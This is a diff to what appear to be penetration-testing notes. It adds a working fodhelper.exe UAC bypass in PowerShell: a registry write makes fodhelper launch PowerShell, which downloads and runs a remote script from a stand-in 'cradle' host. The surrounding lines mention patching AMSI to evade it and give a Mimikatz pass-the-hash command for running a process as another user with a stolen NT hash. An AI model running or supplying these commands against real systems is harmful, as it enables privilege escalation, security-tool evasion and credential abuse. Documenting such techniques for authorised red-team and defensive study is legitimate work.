@@ -264,6 +264,14 @@ Includes web services (not just port 80)
   ```
 - Patch the internals with powershell reflection. See OneNote tagged `AMSI Bypass`.
 
+## UAC Bypasses
+- As of now, the `fodhelper.exe` UAC bypass still worketh (likely the MSF module will be caught by EDR/AV though):
+  ```
+  PS C:\> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://cradle/evil.txt') | IEX" -Force
+  PS C:\> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+  PS C:\> C:\Windows\System32\fodhelper.exe  
+  ```
+
 ## Mimikatz
 You can wrap these in for ex. `PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:lemons /domain:dollarcorp.moneycorp.local /ntlm:NThashHERE /run:powershell.exe`
 - Start new process as target user w/ NT hash:
